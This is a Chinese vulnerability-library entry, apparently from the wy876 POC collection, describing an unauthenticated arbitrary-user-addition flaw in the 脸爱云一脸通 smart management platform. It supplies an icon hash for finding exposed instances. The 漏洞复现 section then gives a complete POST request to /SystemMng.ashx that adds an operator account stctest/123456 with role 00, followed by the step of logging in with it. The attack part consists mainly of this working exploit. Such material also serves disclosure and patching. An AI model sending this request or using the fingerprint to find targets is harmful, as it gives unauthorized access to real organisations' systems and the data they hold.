---
fofa: "web.icon=="
source: "wy876 漏洞文库"
---

# 脸爱云一脸通智慧管理平台SystemMng存在任意用户添加漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台SystemMng存在任意用户添加漏洞。攻击者可通过该漏洞获取应用权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 脸爱云一脸通智慧管理平台

# 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征


# 四、漏洞复现
```plain
POST /SystemMng.ashx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=whnrkuaqbz0lyv1fbwtzf23y
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 175

operatorName=stctest&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
```


使用添加的账号`stctest/123456`登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/txdammysmosfwe7o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
